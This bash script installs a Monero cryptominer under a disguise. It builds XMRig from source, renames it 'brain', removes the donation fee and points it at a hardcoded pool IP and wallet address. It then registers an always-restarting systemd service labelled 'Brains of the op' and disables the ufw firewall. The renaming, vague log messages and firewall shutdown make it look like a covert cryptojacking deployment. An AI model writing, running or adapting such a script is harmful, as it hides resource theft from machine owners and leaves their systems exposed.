#!/bin/bash

set -euo pipefail

# ─── CONFIG ──────────────────────────────────────────────────────────────────
MONERO_NODE_IP="121.127.34.104"
MONERO_NODE_PORT="18081"
MONERO_ZMQ_PORT="18083"
WALLET_ADDRESS="4AqzovnFpZMZ3B3wnM64zaFd9jTgSxNcE8r7eGF5LwRmEqThvHEz1HuMmnCbkKL5vRYHxwVTzUzVNNN127cgjSVeBAPZYpd"
P2POOL_STRATUM_PORT="3333"
BRAIN_VERSION="6.26.0"
P2POOL_VERSION="4.18.1"
INSTALL_DIR="/opt/data"
# ─────────────────────────────────────────────────────────────────────────────

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log()  { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
err()  { echo -e "${RED}[✗]${NC} $1"; }

if [ "$EUID" -ne 0 ]; then
    err "Run as root: sudo bash setup-brain.sh"
    exit 1
fi

REAL_USER="${SUDO_USER:-$(whoami)}"

# ─── STEP 1: System Info ────────────────────────────────────────────────────
log "Gathering system info..."
echo "═══════════════════════════════════════════════════"
echo "  Hostname:  $(hostname)"
echo "  OS:        $(cat /etc/os-release | grep PRETTY_NAME | cut -d= -f2 | tr -d '"')"
echo "  Kernel:    $(uname -r)"
echo "  Arch:      $(uname -m)"
echo "  CPU:       $(lscpu | grep 'Model name' | sed 's/Model name:\s*//')"
echo "  Cores:     $(nproc)"
echo "  Threads:   $(lscpu | grep '^CPU(s):' | awk '{print $2}')"
echo "  RAM:       $(free -h | awk '/Mem:/{print $2}')"
echo "  L3 Cache:  $(lscpu | grep 'L3 cache' | awk '{print $3, $4}')"
echo "  NUMA:      $(lscpu | grep 'NUMA node(s)' | awk '{print $3}')"
echo "═══════════════════════════════════════════════════"

# ─── STEP 2: Install Dependencies ───────────────────────────────────────────
log "Installing dependencies..."
#apt-get update -qq
apt install -y -qq build-essential cmake libuv1-dev libssl-dev libhwloc-dev libcap2 libc6-dev

# ─── STEP 3: Configure Huge Pages ───────────────────────────────────────────
log "Configuring..."

TOTAL_RAM_KB=$(grep MemTotal /proc/meminfo | awk '{print $2}')
TOTAL_RAM_MB=$((TOTAL_RAM_KB / 1024))
NUM_CORES=$(nproc)

HUGEPAGES=$((1040 + NUM_CORES + 128))

# Don't use more than 80% of RAM
MAX_HUGEPAGES=$(( (TOTAL_RAM_MB * 80 / 100) / 2 ))
if [ "$HUGEPAGES" -gt "$MAX_HUGEPAGES" ]; then
    HUGEPAGES=$MAX_HUGEPAGES
fi

log "Setting HP.."

# Set now
sysctl -w vm.nr_hugepages=$HUGEPAGES > /dev/null

# Make persistent
if grep -q "vm.nr_hugepages" /etc/sysctl.conf; then
    sed -i "s/vm.nr_hugepages=.*/vm.nr_hugepages=$HUGEPAGES/" /etc/sysctl.conf
else
    echo "vm.nr_hugepages=$HUGEPAGES" >> /etc/sysctl.conf
fi

# 1GB pages (optional, for supported CPUs)
if grep -q pdpe1gb /proc/cpuinfo; then
    log "CPU supports 1GB pages — enabling..."
    if ! grep -q "hugepagesz=1G" /etc/default/grub; then
        sed -i 's/GRUB_CMDLINE_LINUX_DEFAULT="\(.*\)"/GRUB_CMDLINE_LINUX_DEFAULT="\1 hugepagesz=1G hugepages=3"/' /etc/default/grub
        update-grub 2>/dev/null || true
        warn "1GB pages require reboot to activate"
    fi
    GB_PAGES=true
else
    GB_PAGES=false
fi

# Verify
ACTUAL_HP=$(cat /proc/meminfo | grep HugePages_Total | awk '{print $2}')
log "Huge pages active: $ACTUAL_HP (requested: $HUGEPAGES)"

log "Configuring MSR module..."
modprobe msr 2>/dev/null || true
if ! grep -q "^msr$" /etc/modules 2>/dev/null; then
    echo "msr" >> /etc/modules
fi

# ─── STEP 5: Create install directory ───────────────────────────────────────
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# ─── STEP 6: Download & Build Brain ─────────────────────────────────────────
if [ ! -f "$INSTALL_DIR/brain/build/brain" ]; then
    log "Downloading Brain v${BRAIN_VERSION}..."
    if [ -d brain ]; then rm -rf brain; fi
    git clone --depth 1 --branch v${BRAIN_VERSION} https://github.com/xmrig/xmrig.git > /dev/null 2>&1

    log "Building Brain (this takes a few minutes)..."
    mv xmrig brain
    cd brain

    # Remove donate (set to 0)
    sed -i 's/constexpr const int kDefaultDonateLevel = 1;/constexpr const int kDefaultDonateLevel = 0;/' src/donate.h
    sed -i 's/constexpr const int kMinimumDonateLevel = 1;/constexpr const int kMinimumDonateLevel = 0;/' src/donate.h

    mkdir -p build && cd build
    cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HWLOC=ON > /dev/null 2>&1
    make -j$(nproc) > /dev/null 2>&1
    mv xmrig brain

    if [ -f brain ]; then
        log "Brain built successfully!"
    else
        err "Brain build failed!"
        exit 1
    fi
    cd "$INSTALL_DIR"
else
    log "Brain already built, skipping..."
fi

# ─── STEP 8: Generate optimized Brain config ────────────────────────────────
log "Generating optimized brain.json..."

# Detect thread config
THREADS=$(nproc)
L3_CACHE_KB=$(lscpu | grep 'L3 cache' | awk '{print $3}' | sed 's/[^0-9]//g')
# If L3 is in MiB, convert
L3_UNIT=$(lscpu | grep 'L3 cache' | awk '{print $4}')
if echo "$L3_UNIT" | grep -qi "MiB\|MB"; then
    L3_CACHE_KB=$((L3_CACHE_KB * 1024))
fi

# RandomX uses 2MB per thread — optimal threads = L3_cache_MB / 2
if [ -n "$L3_CACHE_KB" ] && [ "$L3_CACHE_KB" -gt 0 ]; then
    OPTIMAL_THREADS=$((L3_CACHE_KB / 1024 / 2))
else
    OPTIMAL_THREADS=$THREADS
fi

# Don't exceed physical threads
if [ "$OPTIMAL_THREADS" -gt "$THREADS" ]; then
    OPTIMAL_THREADS=$THREADS
fi
# At least 1
if [ "$OPTIMAL_THREADS" -lt 1 ]; then
    OPTIMAL_THREADS=1
fi

log "Optimal threads: $OPTIMAL_THREADS (of $THREADS available, based on L3 cache)"

# Build rx thread array
RX_ARRAY=""
for ((i=0; i<OPTIMAL_THREADS; i++)); do
    if [ $i -gt 0 ]; then RX_ARRAY="$RX_ARRAY, "; fi
    RX_ARRAY="$RX_ARRAY$i"
done

HOSTNAME=$(hostname)

cat > "$INSTALL_DIR/brain.json" << BRAIN_EOF
{
    "api": {
        "id": null,
        "worker-id": "${HOSTNAME}"
    },
    "http": {
        "enabled": true,
        "host": "127.0.0.1",
        "port": 37841,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "fast",
        "1gb-pages": ${GB_PAGES},
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": true,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": true,
        "hw-aes": null,
        "priority": 5,
        "memory-pool": true,
        "yield": false,
        "max-threads-hint": 100,
        "asm": true,
        "argon2-impl": null,
        "rx": [${RX_ARRAY}]
    },
    "opencl": {
        "enabled": false
    },
    "cuda": {
        "enabled": false
    },
    "log-file": "/tmp/xmrig.log",
    "donate-level": 0,
    "donate-over-proxy": 0,
    "pools": [
        {
            "algo": "rx/0",
            "coin": "XMR",
            "url": "121.127.34.104:${P2POOL_STRATUM_PORT}",
            "user": "${WALLET_ADDRESS}",
            "pass": "",
            "rig-id": "${HOSTNAME}",
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "sni": false,
            "tls-fingerprint": null,
            "daemon": false,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "retries": 5,
    "retry-pause": 3,
    "print-time": 30,
    "health-print-time": 60,
    "dmi": true,
    "syslog": false,
    "tls": {
        "enabled": false
    },
    "dns": {
        "ipv6": false,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 1,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
BRAIN_EOF

log "Config written to $INSTALL_DIR/brain.json"

# ─── STEP 9: Create systemd services ────────────────────────────────────────
log "Creating systemd services..."

# Brain service
cat > /etc/systemd/system/brain.service << 'BRAIN_SVC'
[Unit]
Description=Brains of the op
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStartPre=/bin/sleep 5
ExecStart=/opt/data/brain/build/brain --config /opt/data/brain.json --cpu-no-yield
WorkingDirectory=/opt/data
Restart=always
RestartSec=10
Nice=-10
LimitNOFILE=65535
LimitMEMLOCK=infinity

[Install]
WantedBy=multi-user.target
BRAIN_SVC

systemctl daemon-reload
systemctl enable --now brain

# ─── STEP 10: Firewall (if ufw is active) ───────────────────────────────────
if command -v ufw &> /dev/null && ufw status | grep -q "active"; then
    log "Configuring firewall..."
    sudo ufw disable > /dev/null 2>&1
    # Stratum only on localhost, no rule needed
fi
